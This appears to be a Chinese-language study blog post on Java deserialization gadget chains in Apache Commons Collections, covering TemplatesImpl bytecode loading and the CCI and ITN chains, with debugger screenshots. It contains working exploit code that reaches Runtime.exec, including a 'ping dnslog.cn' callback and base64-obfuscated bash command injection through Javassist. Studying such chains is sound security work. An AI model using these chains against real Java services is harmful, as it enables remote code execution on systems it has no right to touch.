<p><code>JAVA</code>虚拟机<code>JVM</code>实际加载运行的是<code>.class</code>文件，而这个<code>.class</code>文件，里面的实际数据就是字节码。那么如果我们可以自定义一个类，其构造函数为打印<code>Hello World</code>，然后将之编译成<code>.class</code>文件，然后让<code>JAVA</code>去加载，就可以触发该类的构造函数了。</p>
<p>那么这个加载<code>.class</code>文件的方法，就是<code>defineClass</code>，以下就是p神提供的一个例子，运行会打印出<code>Hello World</code>。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class,<span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>那么我们需要寻找的链子，就是能够调用到<code>defineClass</code>方法的链子，这里就是<code>TemplatesImpl</code>，其调用链如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer() -&gt;TemplatesImpl.getTransletInstance() -&gt; TemplatesImpl.defineTransletClasses()-&gt; TransletClassLoader.defineClass()</span><br></pre></td></tr></table></div></figure>

<p>相关实际调用截图如下</p>

        <h3 id="链子"   >
          <a href="#链子" class="heading-link"><i class="fas fa-link"></i></a><a href="#链子" class="headerlink" title="链子"></a>链子</h3>
      
        <h4 id="TemplatesImpl-newTransformer"   >
          <a href="#TemplatesImpl-newTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer()"></a>TemplatesImpl.newTransformer()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171708570.png" alt="image-20220803171708570"></p>

        <h4 id="TemplatesImpl-defineTransletClasses"   >
          <a href="#TemplatesImpl-defineTransletClasses" class="heading-link"><i class="fas fa-link"></i></a><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses()"></a>TemplatesImpl.defineTransletClasses()</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171741367.png" alt="image-20220803171741367"></p>

        <h4 id="TransletClassLoader-defineClass"   >
          <a href="#TransletClassLoader-defineClass" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransletClassLoader-defineClass" class="headerlink" title="TransletClassLoader.defineClass()"></a>TransletClassLoader.defineClass()</h4>
      <p>这里的<code>_bytecodes[i]</code>即为<code>TemplatesImpl</code>类中私有成员，我们可以通过反射来为其赋值。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220803171936516.png" alt="image-20220803171936516"></p>

        <h2 id="TrAXFilter"   >
          <a href="#TrAXFilter" class="heading-link"><i class="fas fa-link"></i></a><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2>
      <p>该类未实现<code>Serializable</code>接口，无法进行序列化，所以使用的时候通常结合<code>ConstantTransformer</code>来搭配使用。主要关注其构造函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>即会依据传入的<code>Templates</code>类对象，来调用其<code>newTransformer</code>函数，这个是不是就是可以调用到之前提到的<code>TransformerImpl.newTransformer()</code>从而加载字节码呢。</p>

        <h2 id="InstantiateTransformer"   >
          <a href="#InstantiateTransformer" class="heading-link"><i class="fas fa-link"></i></a><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2>
      <p>同样也是一个实现了<code>Transformer</code>接口的类，主要关注其构造函数和重写的<code>transform</code>函数</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InstantiateTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>可以看到有两个构造函数，当传入有参构造函数时，其成员<code>iParamTypes</code>和<code>iArgs</code>会被赋值，然后在其<code>transform</code>函数中，会依据成员<code>iParamTypes</code>和<code>iArgs</code>来生成实例化对象。</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></div></figure>

<p>那么我们就可以借助该类的<code>transform</code>函数，来生成<code>TrAXFilter</code>类的实例化对象，从而在<code>TrAXFilter</code>的构造函数中，调用到<code>TemplatesImpl.newTransformer()</code>来加载字节码，完成任意函数调用。</p>

        <h1 id="经典链子CCI"   >
          <a href="#经典链子CCI" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子CCI" class="headerlink" title="经典链子CCI"></a>经典链子CCI</h1>
      <p><code>ChainedTransformer-&gt;ConstantTransformer-&gt;InvokerTransformer</code></p>
<p>为了方便，自己命名为<code>CCI</code></p>

        <h2 id="前置知识-2"   >
          <a href="#前置知识-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可以使用<code>ChainedTransformer.transform()</code>来调用其中该数组中的各种<code>transformer</code>，从而获取<code>Runtime</code>来执行命令。举个简单的例子如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch abc&quot;</span>&#125;)&#125;);</span><br><span class="line">        chain.transform(<span class="string">&quot;aaa&quot;</span>);<span class="comment">//随便设置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>调用时<code>ChainedTransformer.transfor()</code>满足如下条件即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121441271.png" alt="image-20220802121441271"></p>
<p>进入之后会一直循环调用</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802121635026.png" alt="image-20220802121635026"></p>
<p>直到最后调用到<code>Runtime的exec</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802122031069.png" alt="image-20220802122031069"></p>

        <h2 id="实际使用"   >
          <a href="#实际使用" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用" class="headerlink" title="实际使用"></a>实际使用</h2>
      <p>调用<code>transform</code>数组获取<code>runtime</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">        String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;ping dnslog.cn&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中一种触发方式,LazyMap.get()</span></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"><span class="comment">//调用LazyMap.get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br></pre></td></tr></table></div></figure>

<p>代表如下获取<code>Runtime</code>的链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801101348788.png" alt="image-20220801101348788"></p>
<p>从<code>LazyMap.get()</code>开始</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>
<p>这里的<code>factory</code>为<code>ChainedTransformer</code>，其<code>transform</code>为一个数组</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802095635405.png" alt="image-20220802095635405"></p>
<p><code>key</code>为<code>123</code>可以随便设置，但是实际调试的时候不知道为什么进不去，应该是<code>p</code>神讲的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100443587.png" alt="image-20220802100443587"></p>
<p>所以导致运行到上述情况时，上层的<code>HashMap</code>中的key已经是一个进程了，所以有值了，导致调试无法进入。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802100604384.png" alt="image-20220802100604384"></p>

        <h1 id="经典链子ITN"   >
          <a href="#经典链子ITN" class="heading-link"><i class="fas fa-link"></i></a><a href="#经典链子ITN" class="headerlink" title="经典链子ITN"></a>经典链子ITN</h1>
      <p><code>InvokerTransformer-&gt;TemplatesImpl.newTransformer</code></p>
<p>同样为了方便自己命名为<code>ITN</code></p>

        <h2 id="前置知识-3"   >
          <a href="#前置知识-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>可使用<code>TemplatesImpl.newTransformer</code>来调用到<code>defineClass</code>加载字节码任意调用，给个简单的例子</p>
<p>多方参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">        CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,dG91Y2ggYWJj&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">        ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">        ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;bytes&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>设置的命令为<code>touch abc</code>。</p>
<p>调试如下，可以看到，满足<code>TemplatesImpl.newTransformer</code>调用时，存在<code>_name</code>，即可调用对应的<code>_bytecodes</code>的字节码。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802113412874.png" alt="image-20220802113412874"></p>

        <h2 id="实际使用-1"   >
          <a href="#实际使用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际使用-1" class="headerlink" title="实际使用"></a>实际使用</h2>
      
        <h3 id="JAVA版本限制"   >
          <a href="#JAVA版本限制" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA版本限制" class="headerlink" title="JAVA版本限制"></a>JAVA版本限制</h3>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html" >BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>也就是<code>Java 8u251</code>以后，<code>JAVA</code>里的<code>ClassLoader</code>被删除，但是官网的<code>JDK</code>里还是有的，所以跑上面的例子代码还是能跑通，但是如果实际环境中可能就不行了，这个不是很懂。</p>
<p>那么如果没有<code>ClassLoader</code>的话，也就不存在下面的加载字节码的方法了，具体原因是<code>newTransformer</code>函数内部会调用到<code>ClassLoader</code>来加载字节码，这个可以参考如下：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/63/" >利用TemplatesImpl加载字节码 - (yang99.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h3 id="解析"   >
          <a href="#解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析" class="headerlink" title="解析"></a>解析</h3>
      <p>该链子的使用方法参考我熊哥的博客：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://maxzed.top/2022/07/13/javadeserializelab%E5%AD%A6%E4%B9%A0%EF%BC%88jdk1-8-0_301%EF%BC%89/" >JavaDeserializeLab学习（jdk1.8.0_301） – maxzed</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>加载字节码，直接运行所需命令</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(String.valueOf(AbstractTranslet.class));</span><br><span class="line">CtClass ctClass = pool.get(test.class.getName());<span class="comment">//新建一个test类，没啥用</span></span><br><span class="line">ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">String code = <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,Li90ZXN0LnNo&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&#125;&quot;</span>;</span><br><span class="line">ctClass.makeClassInitializer().insertAfter(code);</span><br><span class="line">ctClass.setName(<span class="string">&quot;evil&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line"><span class="comment">//调用Get方法</span></span><br><span class="line">TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br></pre></td></tr></table></div></figure>

<p>代表如下运行字节码链子</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802103631920.png" alt="image-20220802103631920"></p>
<p>也是从<code>LazyMap.get()</code>开始，这里调试时上一层<code>HashMap</code>中就没有<code>key</code>值了，所以可以进去</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105100090.png" alt="image-20220802105100090"></p>
<p>然后进入<code>transform</code>中，可以看到对应的要执行的命令字节码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802105822797.png" alt="image-20220802105822797"></p>
